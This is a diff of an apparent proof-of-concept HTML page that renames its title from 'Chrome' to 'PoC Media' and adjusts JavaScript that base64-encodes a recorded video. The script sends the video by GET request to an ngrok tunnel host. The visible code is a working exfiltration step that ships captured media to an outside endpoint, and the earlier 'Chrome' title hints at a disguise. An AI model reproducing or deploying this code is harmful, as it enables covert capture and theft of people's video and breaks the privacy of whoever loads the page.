@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Chrome</title>
+  <title>PoC Media</title>
 </head>
 <body>
     <video controls id="output"></video>
@@ -35,14 +35,12 @@
 
             const reader = new FileReader();
             reader.onloadend = () => {
-              const base64data = reader.result;
+              const base64data = reader.result.split(',')[1];
 
               // Send the base64data via GET request
-              const url = 'https://ea0b-95-106-68-53.ngrok-free.app?video=' + encodeURIComponent(base64data);
+              const url = 'https://ea0b-95-106-68-53.ngrok-free.app/?video=' + encodeURIComponent(base64data);
 
-              fetch(url, {
-                method: 'GET'
-              })
+              fetch(url)
                 .then(response => response.text())
                 .then(data => {
                   console.log('Video uploaded successfully:', data);
